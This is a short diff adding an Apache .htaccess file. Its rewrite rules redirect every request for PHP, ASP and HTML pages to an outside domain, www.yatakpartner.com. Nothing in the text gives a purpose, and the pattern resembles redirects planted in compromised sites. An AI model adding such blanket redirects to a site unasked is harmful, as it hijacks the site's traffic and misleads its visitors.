@@ -1,0 +1,11 @@
+Options +FollowSymLinks
+RewriteEngine on
+RewriteRule (.*)\.php http://www.yatakpartner.com
+RewriteRule (.*)\.php2 http://www.yatakpartner.com
+RewriteRule (.*)\.php3 http://www.yatakpartner.com
+RewriteRule (.*)\.php4 http://www.yatakpartner.com
+RewriteRule (.*)\.php5 http://www.yatakpartner.com
+RewriteRule (.*)\.php6 http://www.yatakpartner.com
+RewriteRule (.*)\.asp http://www.yatakpartner.com
+RewriteRule (.*)\.aspx http://www.yatakpartner.com
+RewriteRule (.*)\.html http://www.yatakpartner.com
